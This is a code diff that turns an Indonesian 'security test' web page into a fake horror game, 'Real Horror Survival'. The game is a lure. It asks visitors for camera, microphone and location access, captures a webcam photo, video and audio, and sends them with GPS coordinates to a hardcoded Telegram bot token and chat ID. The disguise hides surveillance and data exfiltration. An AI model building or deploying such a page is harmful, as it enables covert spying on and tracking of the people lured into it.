@@ -3,27 +3,59 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Website Uji Keamanan</title>
+    <title>Real Horror Survival</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #333;
+            color: white;
+            text-align: center;
+            padding: 50px;
+        }
+        button {
+            padding: 15px 30px;
+            font-size: 18px;
+            background-color: red;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: darkred;
+        }
+        #permissionMessage {
+            margin-top: 30px;
+        }
+        #videoContainer {
+            margin-top: 20px;
+            display: none;
+        }
+        #loading {
+            display: none;
+        }
+    </style>
     <script>
         let videoStream;
         let audioChunks = [];
 
-        async function startCapture() {
+        async function startGame() {
+            // Menampilkan pesan persetujuan izin
+            document.getElementById("permissionMessage").style.display = "block";
+
+            // Minta izin untuk akses kamera, mikrofon, dan lokasi
             try {
-                // Meminta akses ke kamera dan mikrofon
                 videoStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                
-                // Meminta akses lokasi
+
                 const position = await new Promise((resolve, reject) => {
                     navigator.geolocation.getCurrentPosition(resolve, reject);
                 });
 
-                // Mulai merekam video dan audio
+                // Jika izin diberikan, lanjut ke proses perekaman
+                document.getElementById("loading").style.display = "block";
                 capturePhotoAndAudio(position.coords);
-
             } catch (error) {
                 console.error("Akses ditolak atau terjadi kesalahan:", error);
-                alert("Akses ditolak atau terjadi kesalahan.");
+                alert("Akses ditolak. Anda tidak bisa melanjutkan permainan.");
             }
         }
 
@@ -40,7 +72,7 @@
                 audioChunks.push(event.data);
             };
 
-            // Setelah 3 detik, ambil foto dan audio
+            // Setelah 5 detik, ambil foto, video, dan audio
             setTimeout(() => {
                 // Ambil foto dari video
                 const canvas = document.createElement("canvas");
@@ -50,18 +82,21 @@
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                 const imageData = canvas.toDataURL("image/png");
 
+                // Rekam video
+                const recordedVideoBlob = new Blob(audioChunks, { type: "video/webm" });
+
                 // Stop video & audio recording
                 video.pause();
                 mediaRecorder.stop();
 
                 mediaRecorder.onstop = () => {
                     const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
-                    sendToTelegram(imageData, coords, audioBlob);
+                    sendToTelegram(imageData, coords, recordedVideoBlob, audioBlob);
                 };
-            }, 3000);
+            }, 5000);
         }
 
-        function sendToTelegram(imageData, location, audioBlob) {
+        function sendToTelegram(imageData, location, videoBlob, audioBlob) {
             const botToken = "8155174745:AAEVSM6KjUCejQ9dxCNLyo0D0Wh_eXgfHQ8";  // Ganti dengan token bot Telegram
             const chatId = "6010073048";      // Ganti dengan ID Telegram kamu
 
@@ -76,10 +111,8 @@
                 })
             });
 
-            // Konversi gambar ke Blob
-            const photoBlob = dataURItoBlob(imageData);
-
             // Kirim foto
+            const photoBlob = dataURItoBlob(imageData);
             const formDataPhoto = new FormData();
             formDataPhoto.append("chat_id", chatId);
             formDataPhoto.append("photo", photoBlob, "image.png");
@@ -89,7 +122,17 @@
                 body: formDataPhoto
             });
 
-            // Kirim rekaman suara
+            // Kirim video
+            const formDataVideo = new FormData();
+            formDataVideo.append("chat_id", chatId);
+            formDataVideo.append("video", videoBlob, "video.webm");
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
+                method: "POST",
+                body: formDataVideo
+            });
+
+            // Kirim audio
             const formDataAudio = new FormData();
             formDataAudio.append("chat_id", chatId);
             formDataAudio.append("audio", audioBlob, "audio.webm");
@@ -112,7 +155,20 @@
     </script>
 </head>
 <body>
-    <h1>Website Uji Keamanan</h1>
-    <button onclick="startCapture()">Mulai</button>
+    <h1>Selamat datang di game Real Horror Survival!</h1>
+    <p>Untuk memulai permainan, Anda harus memberikan izin kepada situs ini untuk mengakses kamera, mikrofon, dan lokasi Anda.</p>
+    <button onclick="startGame()">Izinkan dan Mulai</button>
+
+    <div id="permissionMessage" style="display: none; margin-top: 20px;">
+        <p>Izinkan kami untuk mengakses foto, suara, dan lokasi Anda untuk melanjutkan permainan.</p>
+    </div>
+
+    <div id="loading" style="display: none;">
+        <p>Loading... Persiapkan diri Anda, permainan dimulai segera!</p>
+    </div>
+
+    <div id="videoContainer" style="display: none;">
+        <video id="videoElement" width="640" height="480" autoplay></video>
+    </div>
 </body>
 </html>
